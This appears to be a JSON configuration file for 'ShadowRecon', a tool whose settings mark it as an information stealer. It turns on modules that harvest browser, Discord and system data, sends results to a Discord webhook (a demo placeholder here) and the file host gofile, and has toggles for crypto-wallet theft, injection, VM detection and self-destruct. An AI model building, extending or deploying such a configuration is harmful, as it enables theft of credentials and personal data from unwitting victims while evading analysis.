{
  "app": {
    "name": "ShadowRecon",
    "version": "3.0.0",
    "environment": "development"
  },
  "webhook": {
    "url": "https://discord.com/api/webhooks/demo/plain-text-demo-webhook",
    "timeout": 30000
  },
  "paths": {
    "temp": "/tmp",
    "output": "./output"
  },
  "upload": {
    "enabled": true,
    "service": "gofile",
    "maxSize": 7340032
  },
  "security": {
    "enableVmDetection": false,
    "enableSelfDestruct": false
  },
  "modules": {
    "enabled": {
      "browsers": true,
      "crypto": false,
      "files": false,
      "discord": true,
      "system": true,
      "injection": false
    }
  }
}